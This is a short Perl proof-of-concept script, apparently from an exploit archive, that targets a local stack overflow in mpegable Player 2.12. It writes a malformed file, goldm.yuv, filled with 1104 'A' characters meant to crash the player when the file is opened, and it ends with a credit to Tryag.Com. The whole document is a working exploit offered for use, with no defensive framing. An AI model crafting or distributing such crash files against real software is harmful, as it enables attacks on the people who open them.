# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ### ###
# #  mpegable Player 2.12 (YUV File) Local Stack Overflow POC   # #
# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### # ##
my $chars= "A" x 1104;
my $file="goldm.yuv";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created \n";
print "Thanx Tryag.Com";
